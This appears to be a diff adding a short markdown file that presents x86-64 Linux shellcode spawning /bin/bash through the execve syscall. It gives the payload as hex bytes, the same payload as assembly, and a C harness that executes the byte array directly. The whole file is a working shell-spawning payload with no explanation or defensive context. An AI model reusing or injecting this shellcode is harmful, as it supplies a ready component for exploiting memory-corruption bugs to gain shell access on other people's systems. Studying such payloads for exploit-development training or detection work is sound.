@@ -1,0 +1,55 @@
+# Shellcode
+
+\x6a\x3b\x58\x48\x31\xf6\x48\x31\xd2\x6a\x68\x49\xba\x2f\x62\x69\x6e\x2f\x62\x61\x73\x41\x52\x48\x89\xe7\x0f\x05
+
+__________________________________________________________________________________________________________________________________________________________________________________________________
+
+# Assembly Program
+
+global _start
+
+
+section .data
+    
+section .text
+
+_start:
+    
+    push 59
+    
+    pop rax
+
+    
+
+    xor rsi,rsi
+    xor rdx,rdx
+    
+    push 0x68
+    
+    mov r10,0x7361622F6E69622f
+    push r10
+   
+    mov rdi,rsp
+    syscall
+
+
+_____________________________________________________________________________________________________________________________________________________________________________________________________
+
+
+# C Program
+
+
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+/* /bin/bash */
+
+int main(){
+    char shellcode[] = "\x6a\x3b\x58\x48\x31\xf6\x48\x31\xd2\x6a\x68\x49\xba\x2f\x62\x69\x6e\x2f\x62\x61\x73\x41\x52\x48\x89\xe7\x0f\x05";
+
+    ((char(*)())shellcode)();
+
+  return 0;
+}                        
